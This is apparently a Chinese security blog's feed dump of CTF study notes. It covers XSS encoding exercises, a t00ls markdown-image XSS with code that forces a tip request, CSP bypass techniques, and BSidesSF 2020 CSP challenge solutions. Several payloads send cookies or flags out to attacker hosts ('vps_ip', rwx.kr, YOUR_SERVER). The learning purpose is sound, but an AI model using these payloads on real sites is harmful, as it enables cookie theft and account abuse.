&quot;javascript:alert(3)&quot;&gt;hhhhh&lt;a&gt;</span><br></pre></td></tr></table></figure><p>浏览器看到<code>&lt;</code>满足HTML解码的条件，然后看到<code>href</code> 满足了URL编码额条件，最后看到<code>javascript</code>满足JS 解码的条件</p><p>于是我们可以反过来编码</p><p>作为攻击者我们应该反过来首先进行一个JS编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;hhhhhh&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>然后进行一个URL编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>最后进行一个HTML编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>其他栗子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onclick&#x3D;&quot;window.open(&#39;value1&#39;)&quot; href&#x3D;&quot;javascript:window.open(value2)&quot;&gt;</span><br></pre></td></tr></table></figure><p>这里的value1：浏览器看到<code>&lt;</code>标签，可以HTML解码，然后看到<code>onclick</code>可以进行JS解码，最后看到<code>window.open</code>可以进行URL解码</p><p>对于value2而言：浏览器看到<code>&lt;</code>标签进行一个HTML解码，然后看到<code>href</code>进行一个URL解码，再之后看到<code>javascript</code>进行一个JS解码，最后看到了<code>window.open</code>编码进行一个URL解码</p><h3 id="XSS-payload判断是否执行练习"><a href="#XSS-payload判断是否执行练习" class="headerlink" title="XSS payload判断是否执行练习"></a>XSS payload判断是否执行练习</h3><h4 id="1-协议被编码导致无法执行"><a href="#1-协议被编码导致无法执行" class="headerlink" title="1 协议被编码导致无法执行"></a>1 协议被编码导致无法执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>href 丢给URL模块解析，但是协议无法识别（即被编码的<code>javascript:</code>），解码失败，不会被执行</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</span><br></pre></td></tr></table></figure><p>先进行htm解码得到  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:%61%6c%65%72%74%28%32%29</span><br></pre></td></tr></table></figure><p>然后href丢给URL模块解析，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(2)</span><br></pre></td></tr></table></figure><p>可以执行</p><h4 id="3-协议被编码，同1"><a href="#3-协议被编码，同1" class="headerlink" title="3 协议被编码，同1"></a>3 协议被编码，同1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript%3aalert(3)&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src&#x3D;x onerror&#x3D;alert(4)&amp;#62;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>无法执行，因为从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;&#x2F;script&amp;#62;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure><p>无法执行，<code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，HTML解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(5)&lt;&#x2F;script&gt;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure><h4 id="6-同5-无法执行"><a href="#6-同5-无法执行" class="headerlink" title="6  同5 无法执行"></a>6  同5 无法执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;&#x2F;script&gt;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><p>这里<code>onclick</code>中为标签的属性值（类比2中的<code>href</code>），会被HTML解码，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><p>然后被执行</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><p><code>onclick</code>中的值会交给JS处理，在JS中只有字符串和<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">标识符</a>能用Unicode表示，<code>&#39;</code>显然不行，JS执行失败</p><h4 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>无法执行</p><p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败</p><p>原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这里js中可以使用Unicode的，只是有些特殊字符不能编码，可以执行</p><h4 id="11-同8，关键字符被编码"><a href="#11-同8，关键字符被编码" class="headerlink" title="11 同8，关键字符被编码"></a>11 同8，关键字符被编码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>不能执行</p><h4 id="12-由于解码是字符串导致无法执行"><a href="#12-由于解码是字符串导致无法执行" class="headerlink" title="12 由于解码是字符串导致无法执行"></a>12 由于解码是字符串导致无法执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这里看似将没毛病，但是这里<code>\u0031\u0032</code>在解码的时候会被解码为字符串<code>12</code>，注意是<strong>字符串</strong>，不是数字，文字显然是需要引号的，JS执行失败</p><p>这样就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&quot;\u0031\u0032&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="14-同8无法执行"><a href="#14-同8无法执行" class="headerlink" title="14 同8无法执行"></a>14 同8无法执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;13\u0027)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>html解码，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</span><br></pre></td></tr></table></figure><p>href识别出是JavaScript协议，URL解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:\u0061\u006c\u0065\u0072\u0074(15)</span><br></pre></td></tr></table></figure><p>可以执行</p><p>总结</p><ol><li><script>和<style>数据只能有文本，不会有HTML解码和URL解码操作</li><li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素</li><li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作</li><li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII</li><li>JavaScript会对字符串和标识符Unicode解码</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="tools网站markdown渲染导致xss"><a href="#tools网站markdown渲染导致xss" class="headerlink" title="tools网站markdown渲染导致xss"></a>tools网站markdown渲染导致xss</h3><p><a href="https://www.hackersb.cn/hacker/235.html" target="_blank" rel="noopener">参考</a></p><p>JavaScript伪协议直接弹框</p><p><img src= "/img/loading.gif" data-src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874638329.png" alt="img"></p><p>Discuz的每一步操作都需要 formhash,获取到这个值之后就可以了</p><p><img src= "/img/loading.gif" data-src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874680248.png" alt="img"></p><p>使用图片来触发xss</p><p><img src= "/img/loading.gif" data-src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874701778.png" alt="img"></p><p>最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![头像&quot; onload&#x3D;alert(1);&#x2F;&#x2F;](https:&#x2F;&#x2F;www.t00ls.net&#x2F;uc_server&#x2F;data&#x2F;avatar&#x2F;000&#x2F;01&#x2F;08&#x2F;66_avatar_middle.jpg)</span><br></pre></td></tr></table></figure><p>之后编写js代码来偷走tubi，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var formhash &#x3D; document.getElementsByName(&#39;formhash&#39;)[0].value; fetch(&quot;https:&#x2F;&#x2F;www.t00ls.net&#x2F;misc.php?action&#x3D;userrate&amp;userratesubmit&#x3D;yes&amp;infloat&#x3D;yes&amp;inajax&#x3D;1&amp;inajax&#x3D;1&quot;, &#123;   method: &quot;POST&quot;,   credentials: &quot;include&quot;,   headers: &#123;     &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,     &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,     &quot;Connection&quot;: &#39;keep-alive&#39;,   &#125;,   body: &quot;formhash&#x3D;&quot; + formhash + &quot;&amp;tid&#x3D;39705&amp;do&#x3D;dashang&amp;handlekey&#x3D;userrate&amp;score&#x3D;%2B10&amp;reason&#x3D;thanks&quot; &#125;).then(function(res) &#123;   if (res.ok) &#123;     alert(&quot;谢谢你的10Tubi！！！&quot;);   &#125; &#125;, function(e) &#123;   alert(&quot;Error submitting form!&quot;); &#125;);</span><br></pre></td></tr></table></figure><p>然后插入图片，引用这个js即可</p></script></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过CSP</title>
      <link href="/posts/1e1d8fb4/"/>
      <url>/posts/1e1d8fb4/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><table><thead><tr><th><code>default-src</code></th><th><code>&#39;self&#39; cdn.example.com</code></th><th>定义资源默认加载策略</th></tr></thead><tbody><tr><td><code>script-src</code></td><td><code>&#39;self&#39; js.example.com</code></td><td>定义 JS 加载策略</td></tr><tr><td><code>style-src</code></td><td><code>&#39;self&#39; css.example.com</code></td><td>定义 CSS 加载策略</td></tr><tr><td><code>img-src</code></td><td><code>&#39;self&#39; img.example.com</code></td><td>定义图片加载策略</td></tr><tr><td><code>connect-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td><code>font-src</code></td><td><code>font.example.com</code></td><td>定义 Font 加载策略</td></tr><tr><td><code>object-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 、、 等引用资源加载策略</td></tr><tr><td><code>media-src</code></td><td><code>media.example.com</code></td><td>定义</td></tr><tr><td><code>frame-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Frame 加载策略</td></tr><tr><td><code>sandbox</code></td><td><code>allow-forms allow-scripts</code></td><td>对页面的操作应用限制，包括阻止弹出窗口，阻止插件和脚本的执行以及强制执行同源策略。可以不设置sanbox的值使得所有限制启用，或者手动启用以下属性 : <code>allow-forms</code> <code>allow-same-origin</code> <code>allow-scripts</code> <code>allow-popups</code>, <code>allow-modals</code>, <code>allow-orientation-lock</code>, <code>allow-pointer-lock</code>, <code>allow-presentation</code>, <code>allow-popups-to-escape-sandbox</code>, and <code>allow-top-navigation</code></td></tr><tr><td><code>report-uri</code></td><td><code>/some-report-uri</code></td><td>指定浏览器报告策略错误的URL，可以在HTTP头中添加<code>-Report-Only</code> 来指示浏览器只报告不阻断</td></tr><tr><td><code>child-src</code></td><td><code>&#39;self&#39;</code></td><td>child-src指令管理了套嵌浏览的部分（类似于iframe、frame标签）</td></tr><tr><td><code>form-action</code></td><td><code>&#39;self&#39;</code></td><td>定义了form表单中action的范围</td></tr><tr><td><code>frame-ancestors</code></td><td><code>&#39;none&#39;</code></td><td>定义<code>&lt;frame&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> <code>&lt;applet&gt;</code>加载策略. 直接设置<code>‘none’</code> 几乎等于设置了<code>X-Frame-Options: DENY</code></td></tr><tr><td><code>plugin-types</code></td><td><code>application/pdf</code></td><td>设置有效的MIME类型</td></tr></tbody></table><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="使用CDN绕过"><a href="#使用CDN绕过" class="headerlink" title="使用CDN绕过"></a>使用CDN绕过</h3><p>一般来说，前端会用到许多的前端框架和库，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险</p><p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo="--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor('alert(document.cookie)')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/hackmdio/codimd/pull/1112/commits/067cfe2d1eedc5a58e5548785858e38fbaa0e84b" target="_blank" rel="noopener">修复</a></p><p><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">orange师傅的文章</a></p><p>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>通过页面跳转功能来实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href &#x3D; &quot;vps_ip:xxxx?&quot;+document.cookie</span><br></pre></td></tr></table></figure><h3 id="link标签绕过-比较老了"><a href="#link标签绕过-比较老了" class="headerlink" title="link标签绕过(比较老了)"></a>link标签绕过(比较老了)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure><p>带外数据的写法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">"link"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"rel"</span>, <span class="string">"prefetch"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"href"</span>, <span class="string">"//vps_ip/?"</span> + <span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(link);</span><br></pre></td></tr></table></figure><p>使用条件：</p><p>k可以执行任意的js脚本，但是无法带外数据</p><h3 id="iframe绕过"><a href="#iframe绕过" class="headerlink" title="iframe绕过"></a>iframe绕过</h3><blockquote><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p></blockquote><h3 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h3><p><a href="https://github.com/google/csp-evaluator/tree/master/whitelist_bypasses" target="_blank" rel="noopener">收集</a></p><h2 id="CSP绕过实例"><a href="#CSP绕过实例" class="headerlink" title="CSP绕过实例"></a>CSP绕过实例</h2><h3 id="BSidesSF-2020-csp-1"><a href="#BSidesSF-2020-csp-1" class="headerlink" title="BSidesSF 2020 csp-1"></a>BSidesSF 2020 csp-1</h3><p>csp如下，<code>script-src</code> 支持 data</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: </span><br><span class="line">    script-src &#39;self&#39; data:; </span><br><span class="line">    default-src &#39;self&#39;; </span><br><span class="line">    connect-src *; </span><br><span class="line">    report-uri &#x2F;csp_report</span><br></pre></td></tr></table></figure><p>可以使用 <code>fetch</code> (js实在是不熟悉)</p><p>payload-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;data:,fetch(&#39;&#x2F;csp-one-flag&#39;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;location&#x3D;&#39;http:&#x2F;&#x2F;rwx.kr&#x2F;?&#39;+escape(x))&quot;&gt;</span><br></pre></td></tr></table></figure><p>或者编码也是可以的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; NOTE:</span><br><span class="line">&#x2F;&#x2F; &quot;ZmV0Y...&quot; is base64 encoded text of this script.</span><br><span class="line">&#x2F;&#x2F; fetch(&quot;https:&#x2F;&#x2F;csp-1-5aa1f221.challenges.bsidessf.net&#x2F;csp-one-flag&quot;).then(r&#x3D;&gt;r.text()).then(t&#x3D;&gt;fetch(&quot;YOUR_SERVER&quot;+t))</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;data:text&#x2F;javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ&#x3D;&#x3D;&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="csp-2"><a href="#csp-2" class="headerlink" title="csp-2"></a>csp-2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; </span><br><span class="line">default-src &#39;self&#39; &#39;unsafe-inline&#39;; </span><br><span class="line">connect-src *; report-uri &#x2F;csp_report</span><br></pre></td></tr></table></figure><p>看到了 <code>ajax.googleapis.com</code> 在白名单中，可以使用其提供的angularjs的模板注入来绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">&#123;&#123;constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"</span>&gt;&lt;<span class="regexp">/script&gt; </span></span><br><span class="line"><span class="regexp">&lt;div class="ng-app"&gt; &#123;&#123; constructor.constructor('fetch("https:/</span><span class="regexp">/csp-2-2446d5a3.challenges.bsidessf.net/</span>csp-two-flag<span class="string">").then(r=&gt;r.text()).then(t=&gt;fetch("</span>YOUR_SERVER<span class="string">"+t))')() &#125;&#125; &lt;/div&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python字符串的一些小坑</title>
      <link href="/posts/e247dc77/"/>
      <url>/posts/e247dc77/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/posts/2d71dd35/"/>
      <url>/posts/2d71dd35/</url>
      
        <content type="html"><![CDATA[<p>就分析几道例题吧</p><h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="CISCN 2019 ikun"></a>CISCN 2019 ikun</h2><p>这题开始脑洞比较大</p><p><img src= "/img/loading.gif" data-src="/posts/2d71dd35/1583819034564.png" alt></p><p>然后观察URL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn&#x2F;shop?page&#x3D;1</span><br></pre></td></tr></table></figure><p>开始以为这里有注入，因为加一个单引号网站就崩了</p><p>但是不然。是需要找到 <code>lv6</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2000</span>):</span><br><span class="line">    res = requests.get(URL+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"lv6.png"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意 <code>res.content</code> 返回的是byte类型， <code>res.text</code> 